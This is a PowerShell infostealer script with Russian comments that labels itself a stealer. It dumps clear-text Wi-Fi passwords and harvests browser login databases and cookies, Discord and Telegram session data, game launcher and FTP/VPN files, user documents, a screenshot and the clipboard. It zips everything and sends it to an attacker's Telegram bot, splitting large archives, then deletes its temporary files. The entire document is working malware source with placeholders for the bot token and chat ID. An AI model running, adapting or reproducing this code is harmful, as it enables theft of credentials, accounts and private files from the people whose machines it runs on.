# --- Настраиваемый блок для текстов сообщений ---
$messages = @{
    Start = "Запуск стиллера...";
    SystemCollect = "Сбор информации о системе";
    BrowsersCollect = "Сбор данных браузеров...";
    FilesCollect = "Сбор файлов...";
    GamingCollect = "Сбор данных игровых клиентов...";
    MessengersCollect = "Сбор логов мессенджеров...";
    Screenshot = "Делаем снимок экрана...";
    UserActivity = "Сбор клипборда и специфической активности...";
    NetworkCollect = "VPN/FTP данные...";
    Archive = "Архивируем данные...";
    TelegramSend = "Отправка архива в Telegram...";
    Success = "Архив успешно отправлен.";
    FailSend = "Не получилось отправить архив.";
    Finished = "Стиллер завершён.";
}

# --- Параметры Telegram ---
$BotToken = "ВАШ_ТОКЕН"
$ChatID = "ВАШ_CHAT_ID"

function WriteMsg($key) {
    Write-Host $messages[$key]
}

# --- Универсальное разделение файла на части ---
function Split-File {
    param (
        [string]$FilePath,
        [int]$PartSizeMB = 49
    )
    $bufSize = 1MB
    $maxBytes = $PartSizeMB * 1MB
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
    $ext = [System.IO.Path]::GetExtension($FilePath)
    $dir = [System.IO.Path]::GetDirectoryName($FilePath)
    $parts = @()
    $f = [System.IO.File]::OpenRead($FilePath)
    try {
        $partIdx = 1
        while ($f.Position -lt $f.Length) {
            $partName = "$dir\$filename.part$partIdx$ext"
            $out = [System.IO.File]::Create($partName)
            $written = 0
            $buf = New-Object byte[] $bufSize
            while ($written -lt $maxBytes -and $f.Position -lt $f.Length) {
                $toRead = [Math]::Min($bufSize, $maxBytes - $written)
                $r = $f.Read($buf, 0, $toRead)
                if ($r -gt 0) {
                    $out.Write($buf, 0, $r)
                    $written += $r
                }
                else { break }
            }
            $out.Close()
            $parts += $partName
            $partIdx++
        }
    } finally {
        $f.Close()
    }
    return $parts
}

# --- Отправка архива в Telegram ---
function Send-ResultToTelegram {
    param (
        [string]$BotToken,
        [string]$ChatID,
        [string]$ZipPath,
        [string]$SystemInfoPath
    )
    $caption = Get-Content $SystemInfoPath | Out-String
    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
    try {
        Add-Type -AssemblyName System.Net.Http
        $fileStream = [System.IO.File]::OpenRead($ZipPath)
        $fileName = [System.IO.Path]::GetFileName($ZipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add($fileContent, "document", $fileName)
        $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
        $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
        $client = New-Object System.Net.Http.HttpClient
        $response = $client.PostAsync($url, $form).Result
        $statusCode = $response.StatusCode
        $reasonPhrase = $response.ReasonPhrase
        $result = $response.Content.ReadAsStringAsync().Result
        $fileStream.Dispose()
        $form.Dispose()
        $client.Dispose()
        if ($statusCode -eq [System.Net.HttpStatusCode]::OK) { return $true }
        else { return $false }
    }
    catch {
        return $false
    }
}

# --- Сбор информации о системе, программ, Wi-Fi ---
function Get-SystemInfo {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
    $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org').Trim() } catch { "N/A" }
    $userInfo = "Username: $($env:USERNAME)" + "`r`n" +
                "ComputerName: $($env:COMPUTERNAME)" + "`r`n" +
                "Local IP: $($ipConfig.IPAddress -join ', ')" + "`r`n" +
                "External IP: $externalIp"
    $userInfo | Out-File "$OutDirectory\user_info.txt"
    Get-ComputerInfo | Out-File "$OutDirectory\computer_info.txt"
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
    Get-WmiObject -Class Win32_Product | Select-Object Name | Out-File -Append "$OutDirectory\installed_programs.txt"
    try {
        $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
        $wifiData = foreach ($profile in $wifiProfiles) {
            try {
                $profileData = (netsh wlan show profile name="$profile" key=clear)
                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
                if ($password) { [PSCustomObject]@{SSID=$profile; Password=$password} }
            } catch {}
        }
        $wifiData | Format-Table -AutoSize | Out-File "$OutDirectory\wifi_passwords.txt"
    } catch {}
}

# --- Поиск и копирование профилей, cookies и логинов из всех браузеров ---
function Get-BrowserData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    # Поиск папок пользовательских профилей любых браузеров (Chromium, Chrome, Edge, Opera, Brave, Vivaldi, Cent, Yandex, Comet, Atlas...)
    $excludeBrowsers = "Default", "Public", "All Users", "System Volume Information"
    $chromiumFiles = "Login Data", "Cookies", "Web Data", "History"
    $profileRoots = @("$env:LOCALAPPDATA", "$env:APPDATA")
    $browserNames = @("chrome","chromium","yandex","opera",".opera",".vivaldi","cent","atlas","comet","brave","edge","firefox","waterfox", "tor", "iridium", "maxthon", "qqbrowser", "dragon", "slimjet")

    foreach ($root in $profileRoots) {
        Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $browserPath = $_.FullName
            if ($browserNames | Where-Object { $browserPath.ToLower().Contains($_) }) {
                # ищем профили внутри найденной программы
                Get-ChildItem -Path $browserPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                    $profilePath = $_.FullName
                    $profileName = $_.Name
                    if ($excludeBrowsers -notcontains $profileName) {
                        New-Item -Path "$OutDirectory\$profileName" -ItemType Directory -Force | Out-Null
                        foreach ($file in $chromiumFiles) {
                            Get-ChildItem -Path $profilePath -Filter $file -ErrorAction SilentlyContinue | ForEach-Object {
                                Copy-Item $_.FullName -Destination "$OutDirectory\$profileName\$file" -Force -ErrorAction SilentlyContinue
                            }
                        }
                    }
                }
            }
        }
    }

    # Firefox
    $ffprofiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($ff in $ffprofiles) {
        $dest = "$OutDirectory\firefox_$($ff.Name)"
        New-Item -Path $dest -ItemType Directory -Force | Out-Null
        Get-ChildItem $ff.FullName -Filter "key4.db", "logins.json", "cookies.sqlite", "places.sqlite" -ErrorAction SilentlyContinue | Copy-Item -Destination $dest -Force
    }
}

# --- Сбор документов и важных файлов пользователя ---
function Gather-Files {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 20MB } | `
                Copy-Item -Destination "$OutDirectory\" -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- Сбор данных игровых клиентов ---
function Get-GameLauncherData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $launcherPaths = @(
        "$env:PROGRAMFILES\Steam", "$env:APPDATA\EpicGamesLauncher", 
        "$env:APPDATA\Battle.net", "$env:LOCALAPPDATA\Ubisoft Game Launcher", 
        "$env:LOCALAPPDATA\GOG.com", "$env:APPDATA\Origin", "$env:APPDATA\EA Desktop"
    )
    foreach ($path in $launcherPaths) {
        if (Test-Path $path) {
            $dest = "$OutDirectory\" + ($path -split "\\")[-1]
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- Сбор данных мессенджеров ---
function Get-MessengerData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            $dest = "$OutDirectory\" + ($path -split "\\")[-1]
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            Copy-Item "$path\Local Storage\leveldb" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $telegramPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $telegramPath) {
        $dest = "$OutDirectory\telegram"
        New-Item -Path $dest -ItemType Directory -Force | Out-Null
        Copy-Item $telegramPath -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# --- Скриншот ---
function Take-Screenshot {
    param($OutFile)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen(0, 0, 0, 0, $screen)
        $bitmap.Save($OutFile)
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

# --- Клипборд и "клавиатурная активность" ---
function Get-UserActivity {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    try { Get-Clipboard | Out-File "$OutDirectory\clipboard.txt" } catch {}
    "[Keylogger] Не реализовано в Powershell." | Out-File "$OutDirectory\keylogger_status.txt"
}

# --- VPN и FTP клиенты ---
function Get-VpnFtpData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue | Copy-Item -Destination "$OutDirectory\VPN_Configs" -Force -ErrorAction SilentlyContinue
    $ftpPaths = @("$env:APPDATA\FileZilla", "$env:APPDATA\WinSCP.ini", "$env:APPDATA\CoreFTP", "$env:APPDATA\Cyberduck", "$env:APPDATA\SmartFTP")
    $destFTP = "$OutDirectory\FTP_Clients"
    New-Item -Path $destFTP -ItemType Directory -Force | Out-Null
    foreach ($ftpPath in $ftpPaths) {
        if (Test-Path $ftpPath) { Copy-Item -Path $ftpPath -Destination $destFTP -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

# --- Основной сценарий ---
function Start-Execution {
    WriteMsg "Start"
    $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
    WriteMsg "SystemCollect"
    Get-SystemInfo -OutDirectory "$tempDir\System"
    WriteMsg "BrowsersCollect"
    Get-BrowserData -OutDirectory "$tempDir\Browsers"
    WriteMsg "FilesCollect"
    Gather-Files -OutDirectory "$tempDir\Files"
    WriteMsg "GamingCollect"
    Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
    WriteMsg "MessengersCollect"
    Get-MessengerData -OutDirectory "$tempDir\Messengers"
    WriteMsg "Screenshot"
    Take-Screenshot -OutFile "$tempDir\screenshot.png"
    WriteMsg "UserActivity"
    Get-UserActivity -OutDirectory "$tempDir\Activity"
    WriteMsg "NetworkCollect"
    Get-VpnFtpData -OutDirectory "$tempDir\Network"
    WriteMsg "Archive"
    $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
    # Анализ размера архива и отправка
    $maxTelegramMB = 49
    $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB,2)
    WriteMsg "TelegramSend"
    if ($zipSizeMB -le $maxTelegramMB) {
        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath "$tempDir\System\user_info.txt"
        if ($ok) { WriteMsg "Success" } else { WriteMsg "FailSend" }
    } else {
        $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
        $allOk = $true
        foreach ($pt in $parts) {
            $ok = Send-ResultToTelegram $BotToken $ChatID $pt "$tempDir\System\user_info.txt"
            if (-not $ok) { $allOk = $false }
        }
        if ($allOk) { WriteMsg "Success" } else { WriteMsg "FailSend" }
    }
    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false
    Remove-Item -Path $zipPath -Force
    WriteMsg "Finished"
}

Start-Execution
